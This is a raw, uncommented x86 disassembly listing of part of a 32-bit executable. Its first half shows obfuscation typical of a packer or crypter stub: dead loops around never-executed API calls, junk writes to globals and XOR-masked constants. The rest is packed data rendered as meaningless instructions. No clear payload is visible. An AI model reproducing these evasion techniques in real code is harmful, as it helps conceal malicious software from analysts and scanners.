  41c43e:	push   0x3dbe
  41c443:	call   DWORD PTR ds:0x424020
  41c449:	mov    ecx,DWORD PTR ds:0x42c018
  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x4237f2
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a96
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423948
  41c5ea:	push   0x4238ad
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423923
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42390e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a44
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x1bd7ebdc
  41ccad:	repz or al,0x98
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx+0xe]
  41ccb9:	jmp    0x41cc92
  41ccbb:	and    al,0xcb
  41ccbd:	or     BYTE PTR ds:0xaeca11c4,ah
  41ccc3:	rol    bh,1
  41ccc5:	jno    0x41ccf8
  41ccc7:	lock pop es
  41ccc9:	and    BYTE PTR [edi-0x43dfb976],al
  41cccf:	ja     0x41cd23
  41ccd1:	cmp    DWORD PTR [edi],ecx
  41ccd3:	in     al,dx
  41ccd4:	jmp    0x70c852ff
  41ccd9:	ss (bad) 
  41ccdb:	xchg   edi,eax
  41ccdc:	jg     0x41cd56
  41ccde:	sub    bl,BYTE PTR [esi]
  41cce0:	push   edx
  41cce1:	ret    
  41cce2:	pop    edi
  41cce3:	fistp  DWORD PTR [ecx+0x44]
  41cce6:	out    0x9c,eax
  41cce8:	cs push ebx
  41ccea:	int3   
  41cceb:	adc    esi,ebx
  41cced:	mov    edx,0x5dc461e1
  41ccf2:	xchg   esp,eax
  41ccf3:	loopne 0x41cc79
  41ccf5:	fisttp WORD PTR [ecx-0x3251868b]
  41ccfb:	lea    ebx,[edi-0x285742cc]
  41cd01:	int3   
  41cd02:	nop
  41cd03:	outs   dx,BYTE PTR ds:[esi]
  41cd04:	xor    DWORD PTR [edx-0x6b],edi
  41cd07:	out    dx,eax
  41cd08:	add    ah,al
  41cd0a:	cli    
  41cd0b:	push   eax
  41cd0c:	scas   al,BYTE PTR es:[edi]
  41cd0d:	fcom   DWORD PTR [esi-0x6f]
  41cd10:	dec    ebx
  41cd11:	dec    ecx
  41cd12:	cld    
  41cd13:	arpl   WORD PTR [esi],si
  41cd15:	adc    DWORD PTR [esi],esi
  41cd17:	or     cl,BYTE PTR [edi+0x1c93e1e1]
  41cd1d:	add    cl,BYTE PTR ds:0xeda897b7
  41cd23:	aaa    
  41cd24:	daa    
  41cd25:	mov    al,0xe
  41cd27:	test   DWORD PTR [ebx],edi
  41cd29:	or     BYTE PTR [ecx+0x4ba283ca],0xd5
  41cd30:	xor    BYTE PTR [esi],cl
  41cd32:	inc    edi
  41cd33:	in     al,0xdf
  41cd35:	out    dx,al
  41cd36:	mov    esi,0x7ae10d11
  41cd3b:	(bad)  
  41cd3d:	add    BYTE PTR [ebp+0xdfd9a90],dh
  41cd43:	aad    0x8f
  41cd45:	test   al,0x6d
  41cd47:	int    0xca
  41cd49:	xor    eax,0xc6a1001a
  41cd4e:	pushf  
  41cd4f:	into   
  41cd50:	in     al,0x1d
  41cd52:	push   0x50
  41cd54:	mov    ah,0xc9
  41cd56:	imul   DWORD PTR [edx]
  41cd58:	dec    edx
  41cd59:	xchg   ebp,eax
  41cd5a:	jb     0x41cd5d
  41cd5c:	cmp    ch,BYTE PTR ds:0x3933a13a
  41cd62:	xor    DWORD PTR ds:0x98e20e86,edi
  41cd68:	jbe    0x41cd8f
  41cd6a:	dec    edi
  41cd6b:	sti    
  41cd6c:	int    0x20
  41cd6e:	pop    edi
  41cd6f:	arpl   WORD PTR [ebx],cx
  41cd71:	adc    eax,0x1d68079a
  41cd76:	and    dh,BYTE PTR [eax-0x4e16b916]
  41cd7c:	jae    0x41cd47
  41cd7e:	xchg   edx,eax
  41cd7f:	bound  edi,QWORD PTR [edx]
  41cd81:	mov    ebp,esi
  41cd83:	sub    DWORD PTR [edx-0x75a60aa2],esp
  41cd89:	out    dx,al
  41cd8a:	xchg   ebx,eax
  41cd8b:	inc    eax
  41cd8c:	push   ds
  41cd8d:	dec    esi
  41cd8e:	ss jl  0x41cdbc
  41cd91:	mov    dl,0x0
  41cd93:	popf   
  41cd94:	sub    cl,BYTE PTR [ebx+0x5f]
  41cd97:	inc    ecx
  41cd98:	sub    al,0xda
  41cd9a:	dec    BYTE PTR [ebx]
  41cd9c:	pop    ebp
  41cd9d:	call   0x666771c4
  41cda2:	jb     0x41ce07
  41cda4:	dec    eax
  41cda5:	test   BYTE PTR ss:[ebx-0x5813192f],al
  41cdac:	pop    esi
  41cdad:	mov    esp,0xdfc36405
  41cdb2:	push   0x2f0be447
  41cdb7:	mov    eax,0x237ad5fb
  41cdbc:	pop    esp
  41cdbd:	pop    edi
  41cdbe:	popa   
  41cdbf:	push   edx
  41cdc0:	adc    ah,al
  41cdc2:	jb     0x41cd67
  41cdc4:	fsubr  st(4),st
  41cdc6:	adc    al,0x3b
  41cdc8:	inc    ebp
  41cdc9:	inc    eax
  41cdca:	cdq    
  41cdcb:	pop    ebp
  41cdcc:	jae    0x41ce19
  41cdce:	mov    ?,ebp
  41cdd0:	sbb    BYTE PTR [edi-0x393cc06f],0x57
  41cdd7:	push   es
  41cdd8:	pop    esi
  41cdd9:	outs   dx,DWORD PTR ds:[esi]
  41cdda:	jnp    0x41ce15
  41cddc:	inc    edx
  41cddd:	scas   al,BYTE PTR es:[edi]
  41cdde:	push   edi
  41cddf:	call   0x975689f2
  41cde4:	push   edx
  41cde5:	mov    dh,0xc1
  41cde7:	pop    ebx
  41cde8:	fld    DWORD PTR [edi+esi*2]
  41cdeb:	or     BYTE PTR [ecx+ebx*4],cl
  41cdee:	(bad)  
  41cdef:	adc    al,0x9e
  41cdf1:	pop    ecx
  41cdf2:	dec    eax
  41cdf3:	dec    esi
  41cdf4:	scas   eax,DWORD PTR es:[edi]
  41cdf5:	jmp    0x41ce59
  41cdf7:	mov    ebp,0x186029c8
  41cdfc:	lock fcomp DWORD PTR [ebp-0x48]
  41ce00:	(bad)  
  41ce02:	es int3 
  41ce04:	xor    esi,DWORD PTR [edx-0x20a07597]
  41ce0a:	lds    ecx,FWORD PTR [eax]
  41ce0c:	adc    BYTE PTR [ebx+0x70],0x5e
  41ce10:	xchg   ebp,eax
  41ce11:	jmp    0x92ae017
  41ce16:	test   al,0xab
  41ce18:	hlt    
  41ce19:	and    BYTE PTR [ecx],bl
  41ce1b:	mov    cl,0x69
  41ce1d:	nop
  41ce1e:	mov    ah,0x60
  41ce21:	loop   0x41cda9
  41ce23:	stc    
  41ce24:	inc    edx
  41ce25:	jle    0x41cda7
  41ce27:	add    bh,ah
  41ce29:	mov    edx,0xbe13aaf6
  41ce2e:	adc    bh,BYTE PTR [edx-0x1d]
  41ce31:	add    eax,0xced9b565
  41ce36:	ret    0x6470
  41ce39:	ror    ebp,0xbf
  41ce3c:	stos   DWORD PTR es:[edi],eax
  41ce3d:	loop   0x41cdfd
  41ce3f:	add    DWORD PTR [ebx],0x77aa3840
  41ce45:	adc    al,0x2d
  41ce47:	in     al,0x77
  41ce49:	jge    0x41cdf9
  41ce4b:	aam    0x3d
  41ce4d:	sub    eax,DWORD PTR [edx]
  41ce4f:	les    esp,FWORD PTR [ebp-0x29]
  41ce52:	mov    dh,0xda
  41ce54:	lea    esp,[ebp+0x11404867]
  41ce5a:	bswap  edi
  41ce5c:	out    0x2,al
  41ce5e:	hlt    
  41ce5f:	dec    edi
  41ce60:	ror    DWORD PTR [ebx],1
  41ce62:	scas   eax,DWORD PTR es:[edi]
  41ce63:	ja     0x41ce30
  41ce65:	sub    eax,DWORD PTR [edi]
  41ce67:	pop    ebx
  41ce68:	jmp    0x41ced5
  41ce6a:	dec    ebx
  41ce6b:	jmp    0x3684:0xac5de8ec
  41ce72:	adc    DWORD PTR [edi+0x50eaa506],edx
  41ce78:	xor    ecx,DWORD PTR [ebx-0x80]
